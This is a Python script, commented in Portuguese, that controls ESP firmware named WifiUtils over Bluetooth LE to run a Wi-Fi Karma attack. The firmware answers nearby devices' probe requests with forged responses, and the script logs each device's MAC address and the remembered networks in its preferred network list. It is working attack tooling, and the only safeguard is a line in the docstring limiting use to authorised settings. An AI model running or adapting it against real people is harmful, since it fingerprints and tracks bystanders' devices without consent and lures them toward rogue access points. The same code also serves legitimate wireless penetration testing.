#!/usr/bin/env python3
"""
Karma attack via firmware WifiUtils.

Captura probe request direcionados de devices próximos e responde com
probe response forjado. Cada (mac, ssid) único é reportado como
KARMA_HIT — útil pra mapear a Preferred Network List dos devices.

ATENÇÃO: ESP precisa estar **NÃO conectado**. Use somente em ambiente
controlado / autorizado.

Uso:
    ~/.platformio/penv/bin/python scripts/karma_test.py \\
        --channel 6 [--duration 60]
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_karma_hit(payload: bytes) -> dict:
    if len(payload) < 7:
        return {"_truncated": payload.hex()}
    mac = ":".join(f"{b:02x}" for b in payload[0:6])
    ssid_len = payload[6]
    ssid = payload[7:7 + ssid_len].decode("utf-8", errors="replace")
    return {"mac": mac, "ssid": ssid}


def decode_karma_done(payload: bytes) -> dict:
    if len(payload) < 11:
        return {"_truncated": payload.hex()}
    return {
        "hits":            int.from_bytes(payload[0:2], "big"),
        "unique_clients":  int.from_bytes(payload[2:4], "big"),
        "unique_ssids":    int.from_bytes(payload[4:6], "big"),
        "elapsed_ms":      int.from_bytes(payload[6:10], "big"),
        "status":          payload[10],
    }


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    pnl = {}  # mac -> set of ssids

    async with BleakClient(dev) as client:
        done_evt = asyncio.Event()
        summary = {}

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            if len(data) < 4:
                return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x24:
                h = decode_karma_hit(payload)
                pnl.setdefault(h['mac'], set()).add(h['ssid'])
                print(f"  HIT  mac={h['mac']}  ssid={h['ssid']!r}")
            elif mtype == 0x25:
                summary.update(decode_karma_done(payload))
                done_evt.set()
            else:
                print(f"  ?  type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        cmd = {
            "cmd": "karma_start", "seq": 1,
            "channel": args.channel,
            "duration_sec": args.duration,
        }
        payload = json.dumps(cmd)
        print(f"→ {payload}")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        try:
            await asyncio.wait_for(done_evt.wait(), timeout=args.duration + 15)
        except asyncio.TimeoutError:
            print("✗ timeout waiting KARMA_DONE")

        if summary:
            print(f"\nKARMA_DONE: hits={summary['hits']} "
                  f"clients={summary['unique_clients']} "
                  f"ssids={summary['unique_ssids']} "
                  f"in {summary['elapsed_ms']}ms")

        if pnl:
            print(f"\n=== PNL mapeada ({len(pnl)} clientes) ===")
            for mac, ssids in sorted(pnl.items()):
                print(f"\n  {mac}:")
                for ssid in sorted(ssids):
                    print(f"    - {ssid!r}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Karma attack via firmware WifiUtils.",
    )
    parser.add_argument("--channel", type=int, required=True, help="Canal (1–13)")
    parser.add_argument("--duration", type=int, default=60,
                        help="Duração em segundos (1–300, default 60)")
    args = parser.parse_args()

    asyncio.run(run(args))
